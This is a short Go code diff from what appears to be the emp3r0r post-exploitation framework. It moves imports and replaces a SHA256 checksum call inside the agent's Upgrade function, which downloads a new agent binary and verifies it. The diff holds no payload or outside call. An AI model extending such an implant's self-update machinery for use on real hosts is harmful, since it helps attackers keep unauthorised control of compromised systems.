@@ -17,7 +17,8 @@ import (
 	"github.com/jaypipes/ghw"
 	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/internal/tun"
-	"github.com/jm33-m0/emp3r0r/core/internal/util"
+	"github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_crypto"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // is the agent alive?
@@ -161,7 +162,7 @@ func Upgrade(checksum string) (out string) {
 	if err != nil {
 		return fmt.Sprintf("Error: Download agent: %v", err)
 	}
-	download_checksum := tun.SHA256SumFile(tempfile)
+	download_checksum := emp3r0r_crypto.SHA256SumFile(tempfile)
 	if checksum != download_checksum {
 		return fmt.Sprintf("Error: checksum mismatch: %s expected, got %s", checksum, download_checksum)
 	}
